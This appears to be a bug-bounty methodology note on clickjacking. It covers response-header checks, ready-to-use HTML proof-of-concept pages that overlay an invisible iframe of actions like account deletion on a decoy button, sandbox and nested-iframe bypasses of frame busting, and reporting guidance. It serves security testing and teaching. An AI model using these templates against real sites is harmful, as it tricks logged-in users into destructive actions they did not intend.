# Clickjacking
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
Attacker creates an invisible iframe overlay of the target site. Victim's clicks go to the target site performing unintended actions. Requires victim to be authenticated.

## Basic Test
```html
<!-- Check if site can be framed -->
<html>
<body>
<iframe src="https://target.com" width="800" height="600"></iframe>
</body>
</html>
```
If the iframe loads the target site → potentially vulnerable.

## Detection

### Check Response Headers
```bash
curl -s -I https://target.com | grep -i "x-frame-options\|content-security-policy"
```

### Header Values and Meanings
```
X-Frame-Options: DENY           → Can't be framed at all (secure)
X-Frame-Options: SAMEORIGIN     → Only same origin can frame (secure)
X-Frame-Options: ALLOW-FROM uri → Specific origin allowed (legacy, deprecated)
X-Frame-Options: ALLOWALL       → Vulnerable!
```

### CSP frame-ancestors
```
Content-Security-Policy: frame-ancestors 'none'         → Same as DENY
Content-Security-Policy: frame-ancestors 'self'         → Same as SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.com → Specific origin
Content-Security-Policy: frame-ancestors *              → Vulnerable!
```

### Vulnerable if
- No `X-Frame-Options` header AND no `frame-ancestors` in CSP
- `ALLOW-FROM` present (modern browsers ignore this)
- `ALLOWALL` or `frame-ancestors *`

---

## PoC Template

### Basic BBB Style
```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    #target {
      position: absolute;
      top: 0; left: 0;
      width: 800px; height: 600px;
      opacity: 0.0001; /* Make invisible */
      z-index: 2;
    }
    #overlay {
      position: absolute;
      top: 300px; left: 200px;  /* Align over target button */
      z-index: 1;
    }
  </style>
</head>
<body>
  <div id="overlay">
    <button>Click here to win a prize!</button>
  </div>
  <iframe id="target" src="https://target.com/sensitive-action"></iframe>
</body>
</html>
```

### WSTG-Style CSS Overlay PoC
```html
<html>
<head>
  <style>
    #iframe {
      position: absolute;
      top: 0; left: 0;
      width: 900px; height: 700px;
      opacity: 0.00001;  /* invisible but clickable */
      z-index: 2;
    }
    #button {
      position: absolute;
      top: 340px; left: 50px;  /* position over target button */
      z-index: 1;
      font-size: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="button">Click here to win a prize!</div>
  <iframe id="iframe" src="https://target.com/account/delete"></iframe>
</body>
</html>
```

---

## Bypass Techniques

### Frame Busting Script Bypass
Some sites use JavaScript to prevent framing:
```javascript
// Target's frame-buster:
if (top !== self) { top.location = self.location; }
```

Bypass with `sandbox` attribute (prevents `allow-top-navigation`):
```html
<iframe sandbox="allow-forms allow-scripts" src="https://target.com">
```
Without `allow-top-navigation`, the frame-buster JS can't break out.

### Double Iframe (ALLOW-FROM Bypass)
Modern browsers don't support `ALLOW-FROM`. Bypass with nested iframes:
```html
<!-- Outer iframe is attacker's domain; inner iframe loads target -->
<iframe src="https://attacker.com/outer">
  <!-- Inside outer: -->
  <iframe src="https://target.com">
```

---

## High-Impact Scenarios

### Password Change
```
Target: https://example.com/settings/password (POST form without CSRF token)
```

### Account Deletion
```
Target: https://example.com/account/delete?confirm=true
```

### Social/Admin Actions
```
Target: https://example.com/like?post_id=ADMIN_POST
Target: https://admin.example.com/users/delete?id=1
```

---

## When to Report

Only report clickjacking if:
1. No `X-Frame-Options` or `frame-ancestors` header
2. The targetable action is **sensitive** (password change, delete account, financial transactions, admin actions)
3. You can actually align the decoy click with the target button (prove it with PoC)

**Don't report** clickjacking on:
- Login pages (no state to steal before authentication)
- Pages where the only action is viewing content
- Pages that already require CSRF tokens verified server-side

## Severity
- **Low**: Can iframe the site but only non-sensitive pages
- **Medium**: Can iframe a moderately sensitive action
- **High**: Can iframe password change, account takeover, admin action, financial transaction
